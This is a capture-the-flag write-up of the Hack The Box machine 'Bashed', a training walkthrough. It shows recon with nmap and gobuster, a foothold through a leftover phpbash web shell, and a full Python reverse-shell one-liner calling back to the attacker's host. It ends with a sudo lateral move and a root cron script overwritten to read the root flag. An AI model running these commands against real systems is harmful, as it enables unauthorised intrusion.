---
title: Bashed
summary: Hack The Box Linux machine where a phpbash web shell left in /dev gives a foothold as www-data, a passwordless sudo to scriptmanager moves sideways, and a root cron running a writable Python script hands over root.
date: 2026-10-20
tags: [Hack The Box, Web, phpbash, sudo, cron, PrivEsc]
difficulty: easy
os: Linux
url: https://app.hackthebox.com/machines/Bashed
---

# CTF Room: Bashed
- [Link to machine](https://app.hackthebox.com/machines/Bashed)
- **Difficulty:** Easy
- **Category:** Web / PrivEsc
- **OS:** Linux

## 1. Brief
Bashed is a nice gentle one. The dev left a phpbash web shell sitting in a `/dev` directory, which gives command execution as `www-data` straight from the browser. From there, `www-data` can sudo to `scriptmanager` without a password, and `scriptmanager` owns a `/scripts` directory whose Python script is run by root on a cron. Overwrite that script and the root flag is mine.

---

## 2. Recon

### NMAP Scan
Default scan first, then version and script detection on what is open.

```bash
nmap machine_ip
nmap -sVC -p80 machine_ip
```
```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
```

Only port 80, Apache 2.4.18, titled "Arrexel's Development Site". I added `bashed.htb` to `/etc/hosts`. The name Arrexel is a strong hint: Arrexel is the author of [phpbash](https://github.com/Arrexel/phpbash), a standalone, semi-interactive PHP web shell. If the dev site is theirs, there is a good chance phpbash is lying around somewhere.

### Directory brute force
```bash
gobuster dir -u http://machine_ip/ -w /usr/share/wordlists/dirb/common.txt -x php,html
```
```text
/about.html           (Status: 200)
/config.php           (Status: 200) [Size: 0]
/contact.html         (Status: 200)
/css                  (Status: 301)
/dev                  (Status: 301)
/images               (Status: 301)
/index.html           (Status: 200)
/php                  (Status: 301)
/uploads              (Status: 301)
```

A `/dev` directory stands out. Browsing to it shows `phpbash.php`, exactly the web shell I was hoping for. Opening `http://machine_ip/dev/phpbash.php` drops me into a shell running as `www-data`, no auth required.

---

## 3. Foothold - www-data

The phpbash shell works, but it is awkward to work in, so I traded it for a proper reverse shell. Listener first:

```bash
nc -lvnp 1337
```

Then in phpbash, a Python reverse shell back to my box:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_ip",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```
```text
Connection received on machine_ip 51648
www-data@bashed:/var/www/html/dev$ whoami
www-data
```

---

## 4. Lateral Movement - scriptmanager

First thing I check with a new shell is sudo rights.

```text
www-data@bashed:/var/www/html/dev$ sudo -l
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

`www-data` can run anything as `scriptmanager`, with no password. So I switch to a full `scriptmanager` shell.

```text
www-data@bashed:/var/www/html/dev$ sudo -u scriptmanager -i
scriptmanager@bashed:~$ whoami
scriptmanager
```

The user flag lives in `arrexel`'s home and is readable from here.

```text
scriptmanager@bashed:/home/arrexel$ cat user.txt
||4e62e449c54d6c36****************||
```

---

## 5. Privilege Escalation - root cron on a writable script

Looking around the filesystem, there is a `/scripts` directory off the root of the box.

```text
scriptmanager@bashed:/$ ls -l /scripts
-rw-r--r-- 1 scriptmanager scriptmanager  ... test.py
-rw-r--r-- 1 root          root           ... test.txt
```

`test.py` is owned by `scriptmanager` (me), but `test.txt` is owned by **root**. The script just writes a string into `test.txt`:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

So something running as root keeps re-running `test.py` and recreating that root-owned `test.txt`. That is a cron job running as root. Since I own `test.py`, I can replace it with whatever I like and root will run it for me. I confirmed I could not `sudo` here (no password), but I do not need to, the cron does the work.

I overwrote `test.py` to copy the root flag somewhere world-readable:

```bash
echo 'import os' > /scripts/test.py
echo 'os.system("cat /root/root.txt > /tmp/readme.txt")' >> /scripts/test.py
```

After the cron fires, the flag is waiting in `/tmp`:

```text
scriptmanager@bashed:/tmp$ cat /tmp/readme.txt
||fa8f6bb08291edb5****************||
```

Same trick gives a full root shell if wanted, by having the cron run a reverse shell or set up a SUID binary. For the flag, the file copy is enough.

---

## 6. Flags / Proof

| Flag | Value |
|:--|:--|
| User flag | `||4e62e449c54d6c36****************||` |
| Root flag | `||fa8f6bb08291edb5****************||` |

---

## 7. Summary
Bashed is a clean string of small mistakes:

- **A web shell left in production.** phpbash in `/dev` is direct command execution as `www-data`, no exploit needed. The site author's name was the tell for where to look.
- **Over-broad sudo.** `www-data` to `scriptmanager` as `NOPASSWD: ALL` is a free lateral move.
- **Root cron on a user-writable script.** `/scripts/test.py` is owned by `scriptmanager` but run by root, so overwriting it runs arbitrary code as root. A root-owned output file next to a user-owned script is the giveaway that a privileged job is running it.

**Tools used:** `nmap`, `gobuster`, phpbash, `nc`, a Python reverse shell.
